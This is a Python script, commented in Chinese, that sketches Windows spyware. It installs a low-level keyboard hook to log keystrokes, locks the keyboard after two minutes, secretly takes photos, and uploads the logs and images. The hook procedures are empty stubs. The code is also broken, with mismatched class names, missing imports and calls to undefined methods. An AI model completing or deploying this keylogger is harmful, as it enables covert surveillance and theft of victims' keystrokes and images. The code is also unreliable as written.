from threading import Thread
from threading import Lock
#工具
class Utiles:
    def __init__(self):
        pass
    def log_debug(self,res):
        if not self.bug:return
        
    def log(self,res):
        self.mutex_log_acquire()
        with open(self.log_path,mode='a',encoding='utf-8') as f:
            f.write(res)
            f.flush()
        self.mutex_log_release()
utils=Utils()
#定义类:定义拥有挂钩与拆钩功能的类
class Toad:
    def __init__(self):
        self.user32=windll.user32
        self.hooked=None
    def __install_hook_proc(self,pointer):
        self.hooked=self.user32.SetWindowsHookExA(
            win32con.WH_KEYBOARD_LL,
            pointer,
            0,
            0
        )
        return True if self.hooked else False

    def install_hook_proc(self,func):
        CMPFUNC=CFUNCTYPE(c_int)
        pointer=CMPFUNC(func)
        if self.__install_hook_proc(pointer):
            utils.log_debug("%s start"%func.__name__)
        msg=MSG()
        #监听/获取窗口的消息,消息进入队列后取出交给钩链中第一个钩子
        self.user32.GetMessageA(byref(msg),None,0,0)
    def uninstall_hook(self):
        pass
toad_obj=Toad()

#2.定义钩子过程(既我们要注入的逻辑)
def monitor_keyborad_proc(nCode,wParam,lParam):
    pass
def lock_keyboard_proc(nCode,wParam,lParam):
    pass
if __name__ == '__main__':
    #监听键盘输入->并记录日志
    t1 = Thread(target=toad_obj.install_hook_proc,args=(monitor_keyborad_proc))
    #锁定键盘功能
    t2 = Timer(120,toad_obj.install_hook_proc,args=[lock_keyboard_proc,])
    #偷拍功能->保存图片文件
    t3 = Thread(target=utils.toke_photoes)
    #上传数据功能:日志文件，图片文件
    t4 = Thread(target=utils.upload_log)
    t5 = Thread(target=utils.upload_photoes)

    t2.daemon = True
    t3.daemon = True
    t4.daemon = True
    t5.daemon = True
    t1.start()
    t2.start()
    t3.start()
    t4.start()
    t5.start()

    t1.join()